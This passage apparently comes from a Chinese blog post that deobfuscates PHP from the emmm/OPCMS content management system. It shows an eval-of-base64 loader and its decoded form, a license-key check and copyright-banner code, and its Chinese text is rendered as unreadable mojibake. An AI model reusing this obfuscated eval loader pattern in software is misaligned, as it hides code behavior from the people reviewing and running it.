9CP+ICa09mY6IXYlx2Yi0TZslHdzBidpRGP+EDavwTKCC446S65+ip5oyZ5NiL5GCb5vGo5h+L5k2q5My77Im45D2p5I6o5wmL5tSL6osDczJmbm8agmH6vkPYnmjYin7TMoxjPiMTY0FGZf1WbtVmI9M3chx2YgYXakxjP2lGZvwjPigHcwUjO0h2ZpVGa7gGdvJmOyFWZsNmI9UGb5R3cgYXakxzJ+0zJ0h2ZpJncld3bw1WZnkQCJoALn4Tas9CP+E2L80bvovIukb7ukL5jm7jIr5WYsJ2Xi0DdldmchRHIiczM9QWamZSehxGczlGZtVncvZWPk9Wb/AHaw5Sb1J3bm9iY1x2YvQXZu5Sbt1WZv8iOwRHdoJSPmVmcoBSY84TasxjPpx2L84TYvwTv9i+i4S+vdaeooauPismbhxmYfJSP0V2ZyFGdgIiNz0DZpZmJ5FGbwNXak1Wdy9mZ9Q2bt9DcoBnLtVncvZ2LiVHbj9Cdl5mLt1Wbl9yL6AHd0hmI9YWZyhGIhxjPpxGP+kGbvwjPh9CPb2Z566K6vyp5Aqo5+IyauFGbi9lI9QXZnJXY0BiIiVHbj9Cdl5mLt1Wbl5yd3d3LvoDc0RHai0jZlJHagEGP+kGb84Tas9CP+E2L8k5qnHZvnnrlmjprl7jIr5WYsJ2Xi0DdldmchRHIiQXZu5Sbt1WZuc3d39yL6AHd0hmI9YWZyhGIhxjPpxGP+kGbvwjPh9CP+QnbvZ2L8MYnmjojmb7uk/avo7jIwADMwYkRjISPy9GbvNGI052bmxjPi4Wah1mI9QXZnJXY0BiIwhGcuMXbjB3bf1WbtV2Ln4SXngGdhBnbp1GZhdyWt1WblRiLnISPmVmcoBSY84TasxzJg4TPgcieiJXZ39GctV2JJkQCKwyJ+YXak9CP+E2L8ESbt1WZ+IyauFGbi9lI9QXZnJXY0BiI0Vmbu0WbtVmL3d3dv8iOwRHdoJSPmVmcoBSY8ASeiBCZlJXZ39GU+IyO4BHMyoDdodWay1yZulGZkFGcgsDewBzM6QHanlWZo1SZulGbgsDdodWaypDdh9GbmJSPlxWe0NHI2lGZ8cCI+0DInIXZ39GctV2JJkQCKwyJ4+Y5sWY5QmZ6Jyp5Aqo5Re65Qio5fyL5our5UCb5IOZ57A3ci5mJ7A3ci5mJsciLpcSWngSZ0FGZucyOwNnYuZyOwNnYuZSKjhyOwNnYuZyOwNnYuZiPh9CPh0WbtVmPismbhxmYfJSP0V2ZyFGdgICdl5mLt1Wbl5yd3d3LvoDc0RHai0jZlJHagEGPgknYgQWZyV2dvB1Jg4TPgcibpd2bsJXZ39GctV2JJkQCKgSehJnchBSPgIXZ39GctVGJJkgC7lSKw8GMw8GMPBzTf1WbtVGJoQXZzNXahgCImlWCKsTbt1WZkwCMvBDMvBzTw80Xt1WblRCIsFmYvx2ZJowepgSNk1Wbt1WZg42bpR3YuVnZKowOpcSahh2ZuFGaT9SYpNXQngCdlN3Xl52b6VWbpR3X0xWdhZWZk9VZ0FGZ&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$OOOOOOO0</span>(<span class="string">&quot;aWYoIWlzc2V0KCRveW9fbG9ja2luZykpew0KJGtleT1maWxlX2dldF9jb250ZW50cygkRW5jb2RldXJsLiJmdW5jdGlvbi9mb250LzhiYTRjM2M1ZGJkZmNmOWMyZDcyNmZlMTFmMWZhOGQ2LnR4dCIpOw0KJGtleT10cmltKCRrZXkpOw0KaWYoJGtleSE9IjhiYTRjM2M1ZGJkZmNmOWMyZDcyNmZlMTFmMWZhOGQ2Iil7DQpkaWUoIjxhIHN0eWxlPVwiY29sb3I6cmVkO2ZvbnQtc2l6ZToxNHB4XCI+6ZSZ6K+v77ya5a+G5YyZ56C05Z2PPC9hPiIpOw0KfQ0KJG95b19sb2NraW5nPSJwYXNzZWQiOw0KfQ0KZXZhbCgkT09PT09PTzAoc3RycmV2KCRPT09PTzBPTykpKTsNCg==&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹èµ·æ¥ä¼¼ä¹åƒæ˜¯shell,ä½†å…¶å®ä¸æ˜¯,åªä¸è¿‡æ˜¯ä¸€äº›ä»£ç çš„å˜åŒ–è€Œå·² æŠŠevalè§£ä¸€ä¸‹å°±æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$OOOOOOO0</span> = <span class="string">&quot;base64_decode&quot;</span>;</span><br><span class="line"><span class="variable">$OOOOO0OO</span> = <span class="string">&quot;=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&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$oyo_locking</span>))&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$Encodeurl</span>.<span class="string">&quot;function/font/8ba4c3c5dbdfcf9c2d726fe11f1fa8d6.txt&quot;</span>);</span><br><span class="line">    <span class="variable">$key</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>!=<span class="string">&quot;8ba4c3c5dbdfcf9c2d726fe11f1fa8d6&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;a style=\&quot;color:red;font-size:14px\&quot;&gt;é”™è¯¯ï¼šå¯†åŒ™ç ´å&lt;/a&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$oyo_locking</span>=<span class="string">&quot;passed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">emmmmd5</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$emmm_O0O0o00o0</span>,<span class="variable">$emmm</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$emmm_O0O0o00o0</span>))&#123;</span><br><span class="line">        <span class="variable">$empower</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;empowerlogin&#x27;</span> =&gt; <span class="string">&#x27;Powered by &lt;a href=&quot;http://www.emmm.net&quot; target=&quot;_blank&quot;&gt;emmm!&lt;/a&gt;Â Â (c)Â Â &#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y&#x27;</span>).<span class="string">&#x27;,Â Â å“ˆå°”æ»¨ä¼Ÿæˆç§‘æŠ€æœ‰é™å…¬å¸&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;empower&#x27;</span> =&gt; <span class="string">&#x27;&lt;div style=&quot;float:right; line-height:30px; padding-right:20px;&quot;&gt;Powered by &lt;a href=&quot;http://www.emmm.net&quot; target=&quot;_blank&quot;&gt;emmm!&lt;/a&gt;&lt;/div&gt;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;empowerbz&#x27;</span> =&gt; <span class="string">&#x27;&lt;li&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$emmm</span>[<span class="string">&#x27;adminpath&#x27;</span>].<span class="string">&#x27;/emmm_opcms.php&quot; target=&quot;main&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;è½¯ä»¶æˆæƒ&lt;/font&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.emmm.net&quot; target=&quot;_blank&quot;&gt;å®˜æ–¹ç½‘ç«™&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.emmm.net/club&quot; target=&quot;_blank&quot;&gt;æŠ€æœ¯è®ºå›&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=36&quot; target=&quot;_blank&quot;&gt;æ¨¡æ¿ä¸‹è½½&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=37&quot; target=&quot;_blank&quot;&gt;æ’ä»¶ä¸‹è½½&lt;/a&gt;&lt;/li&gt;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;empowerright&#x27;</span>=&gt;<span class="string">&#x27;&lt;div style=&quot;clear:both;height:50px&quot;&gt;&lt;/div&gt;&lt;div class=&quot;emmm_data3&quot;&gt;&lt;h1&gt;ç‰ˆæƒä¿¡æ¯Â (è´­ä¹°æˆæƒç‰ˆï¼Œæ­¤ä¿¡æ¯å°†ä¸åœ¨æ˜¾ç¤ºã€‚)&lt;/h1&gt;&lt;div style=&quot;clear:both&quot;&gt;&lt;/div&gt;&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;10&quot;&gt;&lt;tr&gt;&lt;td width=&quot;46%&quot; style=&quot;border-right:1px #CCC solid&quot;&gt;&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;5&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;è½¯ä»¶å¼€å‘ï¼š&lt;/div&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;http://www.emmm.net&quot; target=&quot;_blank&quot;&gt;å“ˆå°”æ»¨ä¼Ÿæˆç§‘æŠ€æœ‰é™å…¬å¸&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;è½¯ä»¶åç§°ï¼š&lt;/div&gt;&lt;/td&gt;&lt;td&gt;emmm&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;è½¯ä»¶å…¶å®ƒå¸¸ç”¨åç§°ï¼š&lt;/div&gt;&lt;/td&gt;&lt;td&gt;å‚²æ´¾ã€å‚²æ´¾CMSã€OPCMS&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;ä¸“åˆ©è¯ä¹¦ï¼š&lt;/div&gt;&lt;/td&gt;&lt;td&gt;2015SR078193Â Â Â Â &lt;a href=&quot;javascript:dialog()&quot;&gt;[æŸ¥çœ‹]&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;é¡¹ç›®è´Ÿè´£äººï¼š&lt;/div&gt;&lt;/td&gt;&lt;td&gt;å”æ™“ä¼Ÿ&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;å¼€å‘å›¢é˜Ÿæˆå‘˜ï¼š&lt;/div&gt;&lt;/td&gt;&lt;td&gt;å¤§é¹ã€è¶…è¶…ã€å°å¨Ÿ&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;div align=&quot;right&quot;&gt;ç›¸å…³é“¾æ¥ï¼š&lt;/div&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=2&quot; target=&quot;_blank&quot;&gt;é—®é¢˜åé¦ˆ&lt;/a&gt; - &lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=36&quot; target=&quot;_blank&quot;&gt;æ¨¡æ¿ä¸‹è½½&lt;/a&gt; - &lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=37&quot; target=&quot;_blank&quot;&gt;æ’ä»¶ä¸‹è½½&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;&lt;td width=&quot;54%&quot; valign=&quot;top&quot;&gt;&lt;style type=&quot;text/css&quot;&gt;.module ul li&#123;height:22px;line-height:22px;color:#CCC&#125;.module ul li a&#123;color:#333&#125;&lt;/style&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.emmm.net/club/api.php?mod=js&amp;bid=5&quot;&gt;&lt;/script&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$emmm_O0O0o00o0</span> == <span class="string">&quot;95d4f8af44&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$empower</span> = <span class="keyword">array</span>(<span class="string">&#x27;empowerlogin&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;empower&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;empowerbz&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;empowerright&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$empower</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;empowerlogin&#x27;</span> =&gt; <span class="string">&#x27;&lt;div id=&quot;Copyright&quot;&gt;Powered by &lt;a href=&quot;http://www.emmm.net&quot; target=&quot;_blank&quot;&gt;emmm!&lt;/a&gt;Â Â (c)Â Â &#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y&#x27;</span>).<span class="string">&#x27;,Â Â å“ˆå°”æ»¨ä¼Ÿæˆç§‘æŠ€æœ‰é™å…¬å¸&lt;/div&gt;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;empower&#x27;</span> =&gt; <span class="string">&#x27;&lt;div style=&quot;float:right; line-height:30px; padding-right:20px;&quot;&gt;Powered by &lt;a href=&quot;http://www.emmm.net&quot; target=&quot;_blank&quot;&gt;emmm!&lt;/a&gt;&lt;/div&gt;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;empowerbz&#x27;</span> =&gt; <span class="string">&#x27;&lt;li&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$emmm</span>[<span class="string">&#x27;adminpath&#x27;</span>].<span class="string">&#x27;/emmm_opcms.php&quot; target=&quot;main&quot;&gt;&lt;font color=&quot;#FF0000&quot;&gt;è½¯ä»¶æˆæƒ&lt;/font&gt;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.emmm.net&quot; target=&quot;_blank&quot;&gt;å®˜æ–¹ç½‘ç«™&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.emmm.net/club&quot; target=&quot;_blank&quot;&gt;æŠ€æœ¯è®ºå›&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=36&quot; target=&quot;_blank&quot;&gt;æ¨¡æ¿ä¸‹è½½&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://emmm.net/club/forum.php?mod=forumdisplay&amp;fid=37&quot; target=&quot;_blank&quot;&gt;æ’ä»¶ä¸‹è½½&lt;/a&gt;&lt;/li&gt;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;empowerright&#x27;</span>=&gt;<span class="string">&#x27;&lt;div style=&quot;clear:both;height:50px&quot;&gt;&lt;/div&gt;&lt;div class=&quot;emmm_data3&quot;&gt;&lt;h1&gt;ç‰ˆæƒä¿¡æ¯Â 